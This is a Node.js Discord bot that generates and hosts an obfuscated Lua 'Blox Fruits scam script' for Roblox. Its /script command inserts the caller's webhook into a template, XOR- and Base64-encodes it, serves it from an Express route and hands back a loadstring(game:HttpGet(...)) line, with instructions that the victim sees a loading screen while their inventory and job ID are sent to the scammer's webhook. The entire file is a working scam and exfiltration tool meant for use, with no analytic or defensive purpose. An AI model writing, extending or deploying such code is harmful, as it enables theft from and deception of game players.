const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const express = require('express');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

// ----- Global script store (in‑memory) -----
const scripts = new Map(); // id -> { content, expires }
const SCRIPT_TTL = 60 * 60 * 1000; // 1 hour

// ----- Web server -----
const app = express();
const PORT = process.env.PORT || 3000;

// Serve obfuscated scripts
app.get('/script/:id', (req, res) => {
    const id = req.params.id;
    const entry = scripts.get(id);
    if (!entry || Date.now() > entry.expires) {
        scripts.delete(id);
        return res.status(404).send('Script not found or expired.');
    }
    res.set('Content-Type', 'text/plain');
    res.send(entry.content);
});

// Health check
app.get('/', (req, res) => res.send('Bot is alive!'));

app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));

// ----- Cleanup expired scripts every 10 minutes -----
setInterval(() => {
    const now = Date.now();
    for (const [id, entry] of scripts) {
        if (now > entry.expires) {
            scripts.delete(id);
        }
    }
}, 10 * 60 * 1000);

// ----- Self‑ping (keep Render awake) -----
const RENDER_URL = process.env.RENDER_URL;
if (RENDER_URL) {
    console.log(`🔁 Self‑ping enabled: ${RENDER_URL}`);
    setInterval(() => {
        axios.get(RENDER_URL).catch(() => {});
    }, 4 * 60 * 1000);
    setTimeout(() => axios.get(RENDER_URL).catch(() => {}), 5000);
} else {
    console.log('⚠️ RENDER_URL not set – self‑ping disabled.');
}

// ----- Discord Bot -----
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    const command = new SlashCommandBuilder()
        .setName('script')
        .setDescription('Generate a Blox Fruits scam script with your webhook')
        .addStringOption(option =>
            option.setName('game')
                .setDescription('Game name (only "bloxfruits" for now)')
                .setRequired(true)
                .addChoices({ name: 'Blox Fruits', value: 'bloxfruits' }))
        .addStringOption(option =>
            option.setName('username')
                .setDescription('Your Discord username (for tracking)')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('Your Discord webhook URL')
                .setRequired(true));

    client.application.commands.create(command);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName !== 'script') return;

    await interaction.deferReply({ ephemeral: true });

    const game = interaction.options.getString('game');
    const username = interaction.options.getString('username');
    const webhook = interaction.options.getString('webhook');

    if (game !== 'bloxfruits') {
        return interaction.editReply({ content: '❌ Only "bloxfruits" is supported right now.' });
    }
    if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
        return interaction.editReply({ content: '❌ Invalid Discord webhook URL.' });
    }

    try {
        // ----- Read template -----
        const templatePath = path.join(__dirname, 'template.lua');
        if (!fs.existsSync(templatePath)) {
            return interaction.editReply({ 
                content: '❌ Template file not found. Please ensure `template.lua` is in the bot directory.' 
            });
        }
        let template = fs.readFileSync(templatePath, 'utf8');
        template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
        template = template.replace(/\{\{USERNAME\}\}/g, username);

        // ----- Obfuscate locally (XOR + Base64) -----
        const obfuscated = obfuscateScript(template);

        // ----- Store script with unique ID -----
        const id = uuidv4();
        scripts.set(id, {
            content: obfuscated,
            expires: Date.now() + SCRIPT_TTL
        });

        // ----- Build loadstring (points to this bot) -----
        const baseUrl = RENDER_URL || `http://localhost:${PORT}`;
        const loadstringLine = `loadstring(game:HttpGet("${baseUrl}/script/${id}"))()`;

        // ----- Reply -----
        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('✅ Script Generated (Obfuscated)')
            .setDescription(`**Game:** ${game}\n**User:** ${username}`)
            .addFields(
                { 
                    name: '📜 Loadstring (copy this)', 
                    value: `\`\`\`lua\n${loadstringLine}\n\`\`\``,
                    inline: false 
                },
                { 
                    name: '🔒 Obfuscation', 
                    value: 'XOR + Base64 (lightweight, no external API)',
                    inline: false 
                },
                { 
                    name: '📌 Instructions', 
                    value: 'Paste the loadstring above into a Blox Fruits executor and run it. The victim will see the loading screen, and you\'ll get their inventory + job ID in your webhook.',
                    inline: false 
                }
            )
            .setTimestamp();

        await interaction.editReply({ embeds: [embed] });

        // ----- Self‑ping after command -----
        if (RENDER_URL) {
            axios.get(RENDER_URL).catch(() => {});
        }

    } catch (error) {
        console.error(error);
        await interaction.editReply({ content: '❌ Failed to generate script: ' + error.message });
    }
});

// ----- Local obfuscator (XOR + Base64) -----
function obfuscateScript(raw) {
    // 1. Generate random XOR key (1-255)
    const key = Math.floor(Math.random() * 254) + 1;

    // 2. XOR encode the entire script
    let xorEncoded = '';
    for (let i = 0; i < raw.length; i++) {
        xorEncoded += String.fromCharCode(raw.charCodeAt(i) ^ key);
    }

    // 3. Base64 encode the XORed string
    const base64 = Buffer.from(xorEncoded, 'binary').toString('base64');

    // 4. Build a loader that decodes and runs it
    return `-- Obfuscated with XOR + Base64
local function decode(str, key)
    local result = ""
    for i = 1, #str do
        result = result .. string.char(string.byte(str, i) ~ key)
    end
    return result
end

local encoded = "${base64}"
local key = ${key}
local decoded = decode(encoded, key)
loadstring(decoded)()
`;
}

client.login(process.env.DISCORD_TOKEN);
